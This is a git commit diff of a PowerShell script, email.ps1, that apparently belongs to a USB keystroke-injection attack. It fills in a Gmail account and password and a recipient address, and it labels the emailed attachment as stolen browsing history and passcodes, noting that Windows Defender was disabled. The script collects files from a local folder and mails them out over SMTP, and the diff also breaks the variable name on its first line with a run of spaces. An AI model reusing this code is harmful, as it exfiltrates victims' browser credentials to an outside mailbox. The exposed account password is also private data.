0e68d28289c88e45c1b6f19892e73cc5bb26af7c
gammerkld <110506515+gammerkld@users.noreply.github.com>
2022-08-02 22:37:30 -0500

    Update email.ps1

--- email.ps1
+++ email.ps1
@@ -1,12 +1,12 @@
-$SMTPServer = 'smtp.gmail.com'
+$SMT                                                                                        PServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAIL@gmail.com', 'YOURPASSWORD');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('wifigrabberpico@gmail.com', 'jc9ZZxW3BnR7Fz');
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'YOUREMAIL@gmail.com'
-$ReportEmail.To.Add('YOUREMAIL@gmail.com')
-$ReportEmail.Subject = 'Duck Report'
-$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$ReportEmail.From = 'wifigrabberpico@gmail.com'
+$ReportEmail.To.Add('mdeemant@gmail.com')
+$ReportEmail.Subject = 'Chrome Hack'
+$ReportEmail.Body = 'Atached is the browsing history and passcodes.And if you used the atack on a Windows PC, Windows Wefencer was disabled.' 
 $files=Get-ChildItem "C:\l\"
 Foreach($file in $files)
 {
